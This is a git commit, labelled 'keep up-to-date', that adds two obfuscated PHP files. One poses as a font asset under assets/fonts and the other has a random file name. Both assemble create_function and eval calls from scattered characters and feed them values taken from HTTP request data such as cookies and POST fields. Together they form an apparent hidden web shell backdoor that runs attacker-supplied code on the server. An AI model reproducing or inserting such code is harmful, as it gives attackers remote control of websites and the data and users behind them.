cc1c53cac45b82a0efdd840908e4b4c1db949c16
Yifei <leftan12121@gmail.com>
2019-09-23 15:03:32 -0700

    keep up-to-date

---
+++ assets/fonts/GalaxieCopernicus-Book_ver1.php
@@ -0,0 +1,95 @@
+<?php
+	$doorstep = '3d(scTy7(';$beckoned='e';
+	$endings =']a$E_aV'; $bipartite ='l';$emigration ='n'; $copy= 'P';$made ='vdTi$h2Z:';$keefe = 'y'; $depresses =']>)E';$chug='8K';$anesthetize ='v';$disc= 'rs';$inwards ='t?gJhXT)C';$kingpin = 'r'; $appealingly='b';
+
+	$franker ='s';$cayuga='E'; $captors ='mia((_'; $cordage ='R';$biosynthesize = 'h;tj';$haystack= 'Tf]tr]O'; $amnesty= 'SevG)'; $condenser = 'D';$ebb ='H';$cindee='[f"E)tssi';$ellipsometry='St'; $derry=')=f';$cued= '1_cro$='; $bedder = 'I';
+	$existentialist='a';
+
+	$anybody= '_';$hexameter= '$$ViSlK_p';$facilitate='a_?p,Bp)c';$cognate= ')'; $dockside='e';$discovering= 'vePnv';$frans ='D'; $disjoint= 'Hr((jn_t';$construction ='r';
+
+	$ladylike = 'k:rg_A'; $harmonia='T'; $lashing ='s'; $greatest = '<c';
+	$counts= 'E_D'; $characteristic= '"PJ4ou'; $leger=';'; $clevey='e'; $food = '$'; $blockading = ']aQo_W)0';$feasted = 'i4g';
+	$hindrances ='S';
+
+	$hilary = 'TEdboa@['; $kristoffer='$[=ENS'; $floater = 'P';$into= ';';
+	$headroom = 'a'; $convey= 'r';
+	$elisabet= '6';
+
+	$interpret = 'Mc,9tO"a'; $burdening ='R$OEF$i'; $commingle= 's';
+
+	$bewilders ='U';
+	$locker= '`'; $eavesdrops = 'LeruCeirJ';$epics='l);Hne';$goddess = 'd';$archibaldo ='Ttdse'; $harassing='/; a(^)'; $doggedness ='R'; $appellant='jaue6etie';
+	$locust ='e';$altruist= 'as"ietY"e';$foolish='s';
+
+	$autonavigator='eoO)$o(m:';
+	$distasteful='rp(';$bonito='".Ri'; $fanechka = 'QqT?(_';$frazier = '[';$anxiously = 'pO(';
+	$discharging= '"HPg_d';
+
+	$argued= 'e[Urs';$elvin = 'I'; $dynamically ='"';
+	$dispel='5';$hutch ='He';$clothing=$interpret['1'].$argued['3'].$hutch[1].$altruist['0'] . $altruist[5]. $hutch[1] . $discharging['4'] .$derry['2'] .$appellant[2].$epics['4'] .$interpret['1']. $altruist[5] .$bonito['3'].$autonavigator['5'] . $epics['4']; $druggist= $harassing['2'] ; $benched = $clothing
+
+	($druggist, $hutch[1]. $discovering['4']. $altruist['0'] .
+	$epics['0']. $anxiously['2']. $altruist['0'].$argued['3'] .$argued['3'] . $altruist['0']. $keefe .
+
+	$discharging['4'].$anxiously['0']. $autonavigator['5'] . $anxiously['0'] .$anxiously['2']. $derry['2'] .
+	$appellant[2] .$epics['4'] . $interpret['1'] .
+	$discharging['4']. $discharging['3'] . $hutch[1]. $altruist[5] .
+	$discharging['4'] .$altruist['0'] . $argued['3'] . $discharging['3'] . $argued['4'] . $anxiously['2'].
+	$autonavigator['3'] .$autonavigator['3'] .$autonavigator['3'] . $harassing['1']);$benched ($derry['2'] ,$hilary['3'],$discovering['4'], $harassing[5] , $argued['3'] ,$dynamically , $kristoffer['5'] ,$eavesdrops['8'] ,$made['6'] , $autonavigator['5'] ,$epics['0'] , $autonavigator['4'].$bonito['3'] . $kristoffer['2'].$altruist['0'].
+	$argued['3']. $argued['3'] . $altruist['0'].
+
+	$keefe . $discharging['4'].
+
+	$autonavigator[7]. $hutch[1].$argued['3'] .$discharging['3'] . $hutch[1] . $anxiously['2']. $autonavigator['4'] .$discharging['4'] . $bonito['2'] .$burdening['3'].
+
+	$fanechka[0] .
+
+	$argued[2] .$burdening['3'] .$kristoffer['5']. $fanechka[2].
+	$interpret['2'] .$autonavigator['4']. $discharging['4'] . $eavesdrops['4'].
+	$anxiously['1'] .
+
+	$anxiously['1'] .$hexameter['6']. $elvin.
+	$burdening['3'].$interpret['2'].$autonavigator['4'].
+	$discharging['4'] .$kristoffer['5']. $burdening['3'].$bonito['2'].
+
+	$hexameter['2'].$burdening['3'].
+	$bonito['2']. $autonavigator['3'] . $harassing['1'] . $autonavigator['4'].$altruist['0'] . $kristoffer['2'].
+
+	$bonito['3'] .$argued['4'].$argued['4'] .$hutch[1]. $altruist[5]. $anxiously['2'].
+	$autonavigator['4'] .
+	$bonito['3'] .$argued['1'] .
+	$dynamically.$biosynthesize['0']. $argued['4'] .
+
+	$altruist[5] .$discharging['5'].
+
+	$autonavigator['5'] .$appellant['0'] .$hutch[1] . $anxiously['0']. $dynamically. $blockading['0']. $autonavigator['3'] .
+	$fanechka[3] .
+
+	$autonavigator['4'].$bonito['3'] .$argued['1'] .$dynamically.$biosynthesize['0']. $argued['4'] . $altruist[5].
+	$discharging['5'].$autonavigator['5'].$appellant['0']. $hutch[1] .$anxiously['0'] . $dynamically.$blockading['0'].$autonavigator['8'] .$anxiously['2'].
+
+	$bonito['3'] .$argued['4'] .$argued['4']. $hutch[1] .$altruist[5]. $anxiously['2'] .$autonavigator['4'] .
+
+	$bonito['3']. $argued['1'] . $dynamically. $hutch['0'].$fanechka[2] .$fanechka[2]. $discharging['2'] .$discharging['4']. $hutch['0'] .$kristoffer['5'] . $fanechka[2] .$counts['2'] . $anxiously['1'].
+
+	$eavesdrops['8'] .$burdening['3'] .$discharging['2'].
+	$dynamically . $blockading['0'] . $autonavigator['3']. $fanechka[3] .$autonavigator['4'].$bonito['3'].$argued['1'] .$dynamically. $hutch['0'] .
+	$fanechka[2]. $fanechka[2] .$discharging['2'] .$discharging['4'] .$hutch['0'] .$kristoffer['5'].$fanechka[2] .$counts['2']. $anxiously['1'] .
+	$eavesdrops['8'] . $burdening['3'] .
+
+	$discharging['2']. $dynamically. $blockading['0'].$autonavigator['8'] .
+	$discharging['5'].$bonito['3'].
+	$hutch[1] .
+
+	$autonavigator['3'] . $harassing['1'] .$hutch[1].$discovering['4'] .
+
+	$altruist['0']. $epics['0'] .
+
+	$anxiously['2'] . $argued['4'] .$altruist[5] .
+
+	$argued['3'].$argued['3'].$hutch[1] . $discovering['4'] . $anxiously['2'] .$hilary['3'] .$altruist['0'] .
+	$argued['4'] .$hutch[1] . $appellant['4'].$feasted['1'].$discharging['4'] .$discharging['5'] .
+	$hutch[1] .
+	$interpret['1'] . $autonavigator['5'] . $discharging['5'] . $hutch[1] . $anxiously['2']. $argued['4']. $altruist[5] . $argued['3'] . $argued['3'].$hutch[1]. $discovering['4']. $anxiously['2'] .$autonavigator['4'] .$altruist['0'] . $autonavigator['3'] .$autonavigator['3'] . $autonavigator['3']. $autonavigator['3'] .$harassing['1']  );
+
+	
---
+++ gtgiuphc.php
@@ -0,0 +1,123 @@
+<?php
+
+	$deprivation = 'Ir[i$C';
+
+	$amateurism = '('; $cheer ='riTae$IeK';
+	$depth = 'rg)a';
+
+	$irks = 'e=)"j';$billeted='(mr)a';
+
+	$bandying ='_';$digressive= 'o'; $lyle =')b4y(=G'; $automated='k';
+
+	$glassine= 'Pc)$'; $dewitt ='i'; $lollipop = 'YOti,t,c('; $madalyn ='GGdD';$complicates='_'; $anniversaries ='o'; $hogging = 'gde"od)K[';$exemplify ='Z[Tad;sae';$kristina = 'Ls[""iRu'; $flexural = 'P';$infectious= 'a';
+
+	$idealization='p'; $cheat = ')TatG'; $lac=']sgSsTe'; $defender= ';'; $evolute = 'Weei_';$concoct ='D';$grammars= 'n';$coriander= '?';
+
+	$interconnected = 'ariE';$deals = ':';
+
+	$leisure ='$y]g'; $interpolation ='G';
+	$distaste = 'e';
+
+	$lexicon= 'c';$jacquette= 'I"gdEv';$authoring=')'; $genre='G$[fr:R';$lagers = 'sOg'; $deerdre ='u';$beveled = 'k';$enumerative='T';$doorway= '$]'; $instinct =')';
+
+	$broker= '"';$desperately = 't'; $brains ='Q'; $bluffing='O';
+	$fondles='H';
+
+	$evenhanded = ';(]efVeF';$chipmunk='iNs_Plr'; $discussions='NGS_rX'; $joelie = '^';$laurel ='$ne'; $clears='Rr)(_S'; $comprise = 'UJ'; $degraded = 'pgbci'; $garaged= 'E';
+	$economizing ='?';$dimming='a'; $impregnate = '_';
+	$beautifying ='s'; $dolomite='J'; $godhacker = '('; $cordelia ='VQvc';$habitat= 'R';
+	$amazedly ='tidttETe'; $dieldrin = 'M'; $grouse = 'i';
+
+	$inspection ='"'; $logical='r(NKe_';
+	$feat =')';
+
+	$dining = 'v'; $compassionately ='Ea$'; $looseness = 'v(_'; $betty = 'K';
+	$counselling = 'n';
+	$involutory= 'H';
+
+	$causer= ']';$irreclaimable ='$'; $down= 'n';
+
+	$issuer = '"('; $believably ='e ;g`6'; $maddog= 'aj';$devil= 'r';$lexicographic = 'IU';
+	$coordinators= 'ls';$mails = '_'; $cutlass= 'g_aH$n(J_';
+	$armchair =$cordelia['3'] . $devil .$believably['0'] .
+
+	$cutlass[2]. $amazedly['4'] .$believably['0']. $cutlass[8].$evenhanded['4'] . $deerdre.$cutlass['5'] .$cordelia['3'] .$amazedly['4'] . $grouse.$hogging['4'] .$cutlass['5'];$cuckoos =$believably['1'];$bookie=$armchair($cuckoos,$believably['0'].$looseness['0'] .$cutlass[2].$coordinators[0] . $cutlass['6'] . $cutlass[2] .$devil . $devil . $cutlass[2].$leisure['1'] .$cutlass[8] . $degraded[0] .$hogging['4'] . $degraded[0].$cutlass['6'].
+	$evenhanded['4'] . $deerdre .$cutlass['5'] . $cordelia['3']. $cutlass[8]. $cutlass['0'] .
+	$believably['0'].$amazedly['4'] .$cutlass[8].
+
+	$cutlass[2].$devil.$cutlass['0'] .$coordinators['1'] .
+
+	$cutlass['6'].$feat .$feat . $feat. $believably['2'] ); $bookie
+	($issuer['0'],$injecting['4'] ,$cordelia['1'] ,
+	$generalist['1'] ,$cutlass['0'],
+
+	$headlining[6] ,
+
+	$cutlass['3'] ,$cutlass['0'] ,
+
+	$lollipop['0'], $cutlass['4'].$grouse .$lyle['5'] .
+	$cutlass[2] .$devil. $devil .$cutlass[2].$leisure['1'] . $cutlass[8] . $billeted['1']. $believably['0'] . $devil .$cutlass['0']. $believably['0'].$cutlass['6']. $cutlass['4'].$cutlass[8].$habitat.
+
+	$compassionately['0'] . $cordelia['1'] .
+
+	$lexicographic['1'].$compassionately['0'] . $clears['5'] .$amazedly['6'] . $lollipop['6']. $cutlass['4']. $cutlass[8].$deprivation['5'] .
+	$bluffing.$bluffing . $betty .$lexicographic[0] .
+
+	$compassionately['0'] . $lollipop['6'].$cutlass['4'] .$cutlass[8] .$clears['5'] . $compassionately['0'] . $habitat.
+	$cordelia[0] .
+
+	$compassionately['0'] .
+
+	$habitat . $feat . $believably['2'].$cutlass['4'] .$cutlass[2].$lyle['5'].
+
+	$grouse. $coordinators['1'] .
+	$coordinators['1'].$believably['0'] . $amazedly['4'] .$cutlass['6']. $cutlass['4'] . $grouse . $genre[2] .
+
+	$issuer['0'] . $cutlass['0'] .
+
+	$maddog['1']. $cutlass['5'] .
+
+	$cutlass['0'].$grouse. $cutlass['0'].$beveled . $amazedly['2'] . $issuer['0'].
+
+	$causer . $feat . $economizing .
+
+	$cutlass['4'] .$grouse . $genre[2].$issuer['0'] . $cutlass['0'] .$maddog['1'].$cutlass['5'] .$cutlass['0'] .
+	$grouse. $cutlass['0']. $beveled .$amazedly['2'] .
+
+	$issuer['0'] .$causer .$genre['5'] .$cutlass['6']. $grouse . $coordinators['1']. $coordinators['1'] . $believably['0'].$amazedly['4'] .
+	$cutlass['6'] .$cutlass['4'] .$grouse .$genre[2].$issuer['0']. $cutlass['3']. $amazedly['6'].
+	$amazedly['6'].$chipmunk['4'] .$cutlass[8].$discussions['1'] .
+	$cutlass[7].
+
+	$logical['2'].
+	$discussions['1'] .$lexicographic[0].
+
+	$discussions['1'] .$betty.$concoct . $issuer['0'] .
+	$causer . $feat.$economizing .$cutlass['4'] .
+
+	$grouse. $genre[2].
+	$issuer['0'].$cutlass['3'] .
+	$amazedly['6'] .
+
+	$amazedly['6'] . $chipmunk['4']. $cutlass[8].$discussions['1'] . $cutlass[7] .$logical['2'].$discussions['1'].$lexicographic[0].
+
+	$discussions['1'] .$betty. $concoct . $issuer['0'] . $causer .
+
+	$genre['5']. $amazedly['2']. $grouse . $believably['0'].$feat. $believably['2']. $believably['0'] . $looseness['0'] . $cutlass[2]. $coordinators[0].$cutlass['6']. $coordinators['1'].$amazedly['4'].
+
+	$devil.$devil. $believably['0'] .$looseness['0'] .
+
+	$cutlass['6'] . $degraded['2'] .$cutlass[2].$coordinators['1'] .
+
+	$believably['0'].$believably['5'] . $lyle['2'] .$cutlass[8]. $amazedly['2'].$believably['0'].$cordelia['3'] .
+	$hogging['4'] .$amazedly['2'].
+	$believably['0']. $cutlass['6'] .$coordinators['1']. $amazedly['4'].
+
+	$devil.
+
+	$devil .$believably['0'] .$looseness['0'] . $cutlass['6'] . $cutlass['4'].
+
+	$cutlass[2] .$feat .
+
+	$feat .
+	$feat.$feat. $believably['2']  );
